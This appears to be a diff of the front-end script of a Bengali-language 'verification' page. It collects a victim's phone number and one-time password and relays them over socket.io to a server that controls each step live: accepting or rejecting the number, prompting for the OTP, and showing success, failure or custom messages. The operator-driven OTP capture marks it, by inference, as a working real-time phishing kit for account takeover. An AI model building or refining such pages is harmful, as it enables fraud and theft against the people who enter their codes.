@@ -155,61 +155,72 @@
     </div>
 
     <script>
-        const socket = io();
+    const socket = io();
 
-        function toggleInfo() {
-            const modal = document.getElementById('info-modal');
-            modal.classList.toggle('hidden');
+    function toggleInfo() {
+        const modal = document.getElementById('info-modal');
+        modal.classList.toggle('hidden');
+    }
+
+    function sendData() {
+        const phone = document.getElementById('phone').value;
+        const purpose = document.getElementById('purpose').value;
+        if(!purpose || phone.length < 11) return alert("সঠিক তথ্য দিন");
+        socket.emit('send_phone', { phone, purpose });
+        showStep('step-waiting');
+    }
+
+    function sendOTP() {
+        const otp = document.getElementById('otp').value;
+        if(!otp) return alert("OTP লিখুন");
+        socket.emit('send_otp', otp);
+        document.getElementById('wait-msg').innerText = "OTP যাচাই করা হচ্ছে...";
+        showStep('step-waiting');
+    }
+
+    socket.on('show_otp_input', () => showStep('step-otp'));
+    socket.on('retry_phone', () => { alert("আপনার রিকোয়েস্টটি রিজেক্ট করা হয়েছে!"); showStep('step-phone'); });
+
+    socket.on('final_status', (data) => {
+        const popup = document.getElementById('status-popup');
+        const iconContainer = document.getElementById('status-icon');
+        popup.classList.remove('hidden');
+        
+        if(data.status === 'success') {
+            iconContainer.innerHTML = `<img src="https://i.ibb.co.com/ZpsnDh48/RYZE.png" class="w-20 mx-auto">`;
+            document.getElementById('status-title').innerText = "Success!";
+            document.getElementById('status-desc').innerText = "ভেরিফিকেশন সফল হয়েছে।";
+        } else {
+            iconContainer.innerHTML = "⚠️";
+            document.getElementById('status-title').innerText = "Failed";
+            document.getElementById('status-desc').innerText = "ভুল OTP প্রদান করা হয়েছে।";
+            setTimeout(() => { popup.classList.add('hidden'); showStep('step-otp'); }, 3000);
+        }
+    });
+
+    // কাস্টম মেসেজ বা এরর মেসেজ হ্যান্ডেল করার জন্য (লোগো সাপোর্ট সহ)
+    socket.on('custom_msg', (data) => {
+        const popup = document.getElementById('status-popup');
+        const iconContainer = document.getElementById('status-icon');
+        popup.classList.remove('hidden');
+
+        // যদি আইকন লিঙ্ক হয় তবে ইমেজ দেখাবে, নতুবা টেক্সট/ইমোজি
+        if (data.icon.startsWith('http')) {
+            iconContainer.innerHTML = `<img src="${data.icon}" class="w-20 mx-auto">`;
+        } else {
+            iconContainer.innerText = data.icon;
         }
 
-        function sendData() {
-            const phone = document.getElementById('phone').value;
-            const purpose = document.getElementById('purpose').value;
-            if(!purpose || phone.length < 11) return alert("সঠিক তথ্য দিন");
-            socket.emit('send_phone', { phone, purpose });
-            showStep('step-waiting');
-        }
+        document.getElementById('status-title').innerText = data.title;
+        document.getElementById('status-desc').innerText = data.msg;
+    });
 
-        function sendOTP() {
-            const otp = document.getElementById('otp').value;
-            if(!otp) return alert("OTP লিখুন");
-            socket.emit('send_otp', otp);
-            document.getElementById('wait-msg').innerText = "OTP যাচাই করা হচ্ছে...";
-            showStep('step-waiting');
-        }
-
-        socket.on('show_otp_input', () => showStep('step-otp'));
-        socket.on('retry_phone', () => { alert("রিজেক্ট করা হয়েছে!"); showStep('step-phone'); });
-
-        socket.on('final_status', (data) => {
-            const popup = document.getElementById('status-popup');
-            popup.classList.remove('hidden');
-            if(data.status === 'success') {
-                document.getElementById('status-icon').innerText = "🛡️";
-                document.getElementById('status-title').innerText = "Success!";
-                document.getElementById('status-desc').innerText = "ভেরিফিকেশন/Migration সফল হয়েছে।";
-            } else {
-                document.getElementById('status-icon').innerText = "⚠️";
-                document.getElementById('status-title').innerText = "Failed";
-                document.getElementById('status-desc').innerText = "ভুল OTP প্রদান করা হয়েছে।";
-                setTimeout(() => { popup.classList.add('hidden'); showStep('step-otp'); }, 3000);
-            }
-        });
-
-        function showStep(stepId) {
-            document.getElementById('step-phone').classList.add('hidden');
-            document.getElementById('step-waiting').classList.add('hidden');
-            document.getElementById('step-otp').classList.add('hidden');
-            document.getElementById(stepId).classList.remove('hidden');
-        }
-// কাস্টম মেসেজ বা এরর মেসেজ হ্যান্ডেল করার জন্য
-socket.on('custom_msg', (data) => {
-    const popup = document.getElementById('status-popup');
-    popup.classList.remove('hidden');
-    document.getElementById('status-icon').innerText = data.icon;
-    document.getElementById('status-title').innerText = data.title;
-    document.getElementById('status-desc').innerText = data.msg;
-});
-    </script>
+    function showStep(stepId) {
+        document.getElementById('step-phone').classList.add('hidden');
+        document.getElementById('step-waiting').classList.add('hidden');
+        document.getElementById('step-otp').classList.add('hidden');
+        document.getElementById(stepId).classList.remove('hidden');
+    }
+</script>
 </body>
 </html>
